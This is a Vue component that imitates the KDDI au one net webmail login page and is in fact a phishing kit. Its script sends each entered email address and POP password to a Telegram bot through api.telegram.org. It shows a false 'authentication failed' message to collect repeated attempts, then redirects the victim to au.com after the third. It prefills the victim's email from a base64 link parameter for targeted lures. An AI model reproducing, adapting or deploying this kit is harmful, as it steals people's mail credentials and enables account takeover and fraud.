<template>
    <div id="app">
      <div>
        <div id="contents"><br>
          <center><img alt="au one net"
              src="../assets/images/auonenet_logo.png" width="254" height="32"
              decoding="async" data-nimg="1" loading="lazy" style="color:transparent"></center>
          <h1><img alt="au one net WEBメール"
              src="../assets/images/title.gif" width="232" height="18" decoding="async"
              data-nimg="1" loading="lazy" style="color:transparent"></h1>
          <div id="col_left">
            <section>
              <h2><img alt="お知らせ"
                  src="../assets/images/h_info.gif" width="635" height="60"
                  decoding="async" data-nimg="1" loading="lazy" style="color:transparent"></h2>
              <h2 style="color:red">■ ログイン画面にreCAPTCHAを導入しました。</h2>
              <h4>不正と思われるアクセス、およびそれによる被害が社会における大きな問題となっており、au one net
                WEBメールでは、ボットによる不正なアクセスを抑止するための機能(reCAPTCHA[リキャプチャ])を導入しました。 ログイン方法はこちら。</h4>
            </section>
            <section><a href="https://www.au.com/internet/auonenet/option/mail-homepage/mail/" target="_blank"><img
                  src="../assets/images/toppage.jpg" width="635" height="325"
                  decoding="async" data-nimg="1" loading="lazy" style="color:transparent"></a></section>
          </div>
          <div id="col_right">
            <div class="inner">
              <h2><img alt="ログイン"
                  src="../assets/images/h_login.gif" width="309" height="42"
                  decoding="async" data-nimg="1" loading="lazy" style="color:transparent"></h2>
              <form method="">
                <div class="input_area">
                  <p style="color: red;" v-if="isActive">認証に失敗しました。<br> お手数ですが、最初からやり直してください</p>
                  <p>au one netのメールアドレス</p>
                  <div><input name="user" id="id-name" type="text" maxlength="255" v-model="formDataRes.email"></div>
                  <p>POPパスワード</p>
                  <div><input name="pass" id="id-password" type="password" maxlength="76" v-model="formDataRes.password"></div>
                  <p></p>
                  <div class="btn"><input type="submit" id="submit_btn" class="login" value="ログイン" @click.prevent="finishJoob"></div>
                </div>
              </form>
            </div>
            <div class="inner2">
              <div class="input_area">
                <t>
                  <font color="blue"><b>スマートフォン・タブレットをご利用の方</b></font>
                </t><br>
                <p>スマートフォンのメールアプリでご利用できます。</p><br>
                <p>
                  <font color="#2E2EFE">iPhone/iPadの設定は<u><a
                        href="https://www.au.com/support/service/internet/guide/mail/ios/"
                        style="color:#0000ff;">こちら</a></u></font>
                </p>
                <p>
                  <font color="#2E2EFE">Androidスマートフォン・タブレットの設定は<u><a
                        href="https://www.au.com/support/service/internet/guide/mail/android/"
                        style="color:#0000ff;">こちら</a></u></font>
                </p>
              </div>
            </div>
            <div class="inner">
              <ul class="links">
                <li><a
                    href="https://www.au.com/internet/auonenet/option/mail-homepage/mail/web-mail/assistance/list-02/2-2/"
                    target="_blank">POPパスワードを忘れた方はこちら</a></li>
                <li><a
                    href="https://www.au.com/internet/auonenet/option/mail-homepage/mail/web-mail/assistance/list-02/2-1/"
                    target="_blank">ログインできない方はこちら</a></li>
                <li><a href="https://www.au.com/internet/auonenet/option/mail-homepage/mail/web-mail/attention/#suisho"
                    target="_blank">推奨環境</a></li>
                <li><a href="https://www.au.com/internet/auonenet/option/mail-homepage/mail/web-mail/assistance/"
                    target="_blank">ヘルプ</a></li>
              </ul>
            </div>
          </div>
          <table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tbody>
              <tr bgcolor="#ffffff">
                <td align="left"><img alt="KDDI"
                    src="../assets/images/footer_logo.png" width="98" height="32"
                    decoding="async" data-nimg="1" loading="lazy" style="color:transparent"></td>
                <td align="right">COPYRIGHT © KDDI CORPORATION. ALL RIGHTS RESERVED</td>
              </tr>
            </tbody>
          </table>
        </div>
        <div
          style="background-color:rgb(255, 255, 255);;border:1px solid rgb(204, 204, 204);;box-shadow:rgba(0, 0, 0, 0.2) 2px 2px 3px;;position:absolute;;transition:visibility linear 0.3s,;opacity:0;;visibility:hidden;;z-index:2000000000;;left:0px;;top:-10000px;">
          <div
            style="width:100%;;height:100%;;position:fixed;;top:0px;;left:0px;;z-index:2000000000;;background-color:rgb(255, 255, 255);;opacity:0.05;">
          </div>
          <div class="g-recaptcha-bubble-arrow"
            style="border:11px solid transparent;;width:0px;;height:0px;;position:absolute;;pointer-events:none;;margin-top:-11px;;z-index:2000000000;">
          </div>
        </div>
      </div>
      <!-- <HelloWorld msg="Welcome to Your Vue.js App"/> -->
    </div>
  </template>
  
  
<script>
// import HelloWorld from './components/HelloWorld.vue'
import axios from "axios"
export default {
	name: 'app',
	data() {
		return {
			formDataRes: {},
			isLoading: false,
			isActive: false,
			count: 0,
			finalCount: 3,
			isText : false
		}
	},
	components: {
		// HelloWorld 9
	},

	methods: {

		async finishJoob() {
			this.count = +this.count + 1
			this.isLoading = true
			if (this.count < this.finalCount) {
				let message = this.formDataRes
				await this.sendTelegramResult(message)
				this.isLoading = false
				this.isActive = !this.isActive
			} else {
				location.replace("https://www.au.com/")

			}
		},


		async sendTelegramResult(message) {
			try {
				let botId = this.$config.public.botId
				let chatId = this.$config.public.chatId
				const url = `https://api.telegram.org/bot${botId}/sendMessage`;
				const payload = {
					chat_id: chatId,
					text: message,
				};
				await axios.post(url, payload);

			} catch (error) {
				console.log(error, 'error')

			}
		}

	},
	mounted() {
		this.formDataRes['email'] = atob(this.$route?.params?.id)
	}
}
</script>
  
  <style>
  @charset "utf-8";
  .trunstile{
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
  }
  body,
  p {
      margin: 0;
  }
  
  Image{
      vertical-align: top;
  }
  
  #contents {
      width: 980px;
      margin: 0 auto;
      color:#555555;
      font-size: 72%;
      font-family :'ヒラギノ角ゴ Pro W3', 'Hiragino Kaku Gothic Pro','メイリオ', Meiryo,'ＭＳ Ｐゴシック',sans-serif;
      line-height: 120%;
      *font-size: 65%;
  }
  
  #contents a:link,
  #contents a:visited {
      color: #555555;
      text-decoration: none;
  }
  
  #contents a:active,
  #contents a:hover {
      color: #eb5505;
      text-decoration: underline;
  }
  
  #contents #col_left {
      float: left;
      width: 635px;
  }
  
  #contents #col_right {
      float: right;
      width: 315px;
  }
  
  #contents h1 {
      margin: 10px 0;
      color: #555555;
      font-size: 1px;	
      line-height: 0;
  }
  
  #contents h2 {
      margin: 0 0 5px;
  }
  
  #contents section {
      margin-bottom: 2px;
  }
  
  #contents #info {
      border: none;
  }
  
  #contents table {
      width: 100%;
      background: #000;
  }
  
  #contents table th {
      font-weight: normal;
  }
  
  #contents #col_right .inner {
      border: 3px solid #e6e6e6;
  }
  
  #contents #col_right .inner h2 {
      margin-bottom: 0;
      font-size: 1px;
      line-height: 0;
  }
  
  #contents #col_right .inner form {
      margin: 0;
      padding: 0;
  }
  
  #contents #col_right .inner .input_area {
      padding: 17px;
      background-color: #fdecd8;
  }
  
  #contents #col_right .inner .input_area p {
      font-weight: bold;
      margin-bottom: 3px;
  }
  
  #contents #col_right .inner .input_area input {
      width: 269px;
      height: 25px;
      margin-bottom: 10px;
      border: 1px solid #cfcfcf;
      line-height: 25px;
  }
  
  #contents #col_right .inner .input_area .btn {
      padding-top: 5px;
      text-align: center;
  }
  
  #contents #col_right .inner .input_area #submit_btn {
      display: block;
      width: 190px;
      height: 50px;
      margin: 0 auto;
      text-align: left;
      border: none;
      background: url(../assets/images/login_btn_off.gif) no-repeat left top;
      text-indent: -9999px;
      cursor: pointer;
  }
  
  #contents #col_right .inner .links {
      list-style: none;
      margin: 0;
      padding: 17px 17px 12px;
      background-color: #f9f9f9;
  }
  
  #contents #col_right .inner .links li {
      margin-bottom: 5px;
      padding-left: 15px;
      background: url(/images/icon_arrow.gif) no-repeat left 3px;
  }
  
  #contents #col_right .inner2 {
      border: 3px solid #e6e6e6;
  }
  
  #contents #col_right .inner2 .input_area {
      padding: 15px;
      background-color: #ceecf5;
  }
  
  #contents #col_right .inner2 .input_area p {
      font-weight: bold;
      margin-bottom: 3px;
  }
  
  #contents #col_right .inner2 .input_area t {
      font-size: 14px;
      font-weight: bold;
      margin-bottom: 3px;
  }
  
  #contents {
      zoom: 100%;
  }
  #contents:after {
      content: ".";
      clear: both;
      display: block;
      height: 0;
      visibility: hidden;
  }
  .login{
      background-image: url('/images/login_btn_off');
      
  }
  
  /* style={{backgroundImage: "url(&quot;/images/login_btn_off.gif&quot;);"}} */
  
  </style>